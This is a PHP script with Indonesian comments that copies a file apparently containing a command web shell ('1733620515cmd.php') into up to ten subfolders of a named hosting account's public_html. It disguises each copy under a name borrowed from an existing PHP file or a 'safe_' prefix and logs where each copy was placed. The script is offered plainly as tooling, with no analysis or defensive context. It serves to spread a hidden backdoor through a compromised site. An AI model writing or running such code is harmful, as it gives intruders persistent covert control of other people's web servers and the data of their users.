<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

// ============================
// KONFIGURASI
// ============================
$baseDir = '/home/ibpequipment/public_html';  // Folder utama
$sourceFile = __DIR__ . '/1733620515cmd.php';          // File sumber
$resultFile = __DIR__ . '/result.txt';        // Log hasil
$maxPerBatch = 10;                            // Jumlah folder yang akan diproses per batch

// ============================
// FUNGSI
// ============================
function findTargetFolders($baseDir) {
    if (!is_dir($baseDir)) {
        exit("Direktori tidak ditemukan: $baseDir");
    }

    $skipPattern = '/(cache|tmp|log|logs|cgi-bin)/i';

    // Ambil semua subfolder 1 tingkat di public_html
    $dirs = glob(rtrim($baseDir, '/') . '/*', GLOB_ONLYDIR);

    // Filter folder yang tidak perlu
    $dirs = array_filter($dirs, fn($d) => !preg_match($skipPattern, $d));

    // Hilangkan duplikasi dan normalisasi
    $dirs = array_unique(array_map('rtrim', $dirs));

    return array_values($dirs);
}

function smartCopy($sourceFile, $targetDir) {
    if (!is_dir($targetDir)) return false;

    $phpFiles = glob($targetDir . '/*.php');
    $phpFiles = array_filter($phpFiles, fn($f) => strtolower(basename($f)) !== 'index.php');

    if (!empty($phpFiles)) {
        $main = basename(reset($phpFiles));
        $mainName = pathinfo($main, PATHINFO_FILENAME);
        $rename = $mainName . '_copy.php';
    } else {
        $rename = 'safe_1733620515cmd.php';
    }

    $targetFile = rtrim($targetDir, '/') . '/' . $rename;

    if (strtolower(basename($targetFile)) === 'index.php') {
        $targetFile = rtrim($targetDir, '/') . '/index_safe.php';
    }

    return @copy($sourceFile, $targetFile) ? $targetFile : false;
}

// ============================
// EKSEKUSI
// ============================
if (!file_exists($sourceFile)) {
    exit("File sumber 1733620515cmd.php tidak ditemukan di: $sourceFile");
}

$allTargets = findTargetFolders($baseDir);

if (empty($allTargets)) {
    exit("Tidak ada folder target ditemukan di: $baseDir");
}

// Ambil hanya 10 folder pertama (bisa diubah)
$targets = array_slice($allTargets, 0, $maxPerBatch);

$log = [];
foreach ($targets as $dir) {
    $copiedTo = smartCopy($sourceFile, $dir);
    if ($copiedTo) {
        $log[] = "[OK] $copiedTo";
    } else {
        $log[] = "[SKIP] $dir";
    }
}

// Simpan log hasil
file_put_contents($resultFile, implode(PHP_EOL, $log));

echo "<pre>Distribusi selesai ✅
Total folder diproses: " . count($targets) . "

" . implode("\n", $log) . "</pre>";

?>